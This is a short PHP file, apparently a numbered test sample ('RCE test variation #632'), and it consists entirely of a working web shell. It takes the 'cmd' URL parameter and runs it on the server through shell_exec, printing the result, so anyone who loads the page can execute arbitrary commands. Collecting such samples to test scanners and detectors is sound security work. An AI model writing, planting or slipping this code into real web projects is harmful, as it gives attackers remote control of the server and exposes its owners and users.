<?php
// RCE test variation #632
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>